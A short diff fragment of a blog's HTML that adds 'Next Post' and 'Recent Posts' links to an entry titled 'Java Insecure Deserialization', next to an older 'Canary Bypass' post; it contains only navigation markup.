+        <a class="basic-alignment right" href="/blog/2019/11/22/java-insecure-deserialization/" title="Next Post: Java Insecure Deserialization">Java Insecure Deserialization &raquo;</a>
       
     </p>
   </footer>
@@ -2235,6 +2270,10 @@
 <section>
   <h1>Recent Posts</h1>
   <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2019/11/22/java-insecure-deserialization/">Java Insecure Deserialization</a>
+      </li>
     
       <li class="post">
         <a href="/blog/2019/07/16/canary-bypass/">Canary Bypass</a>
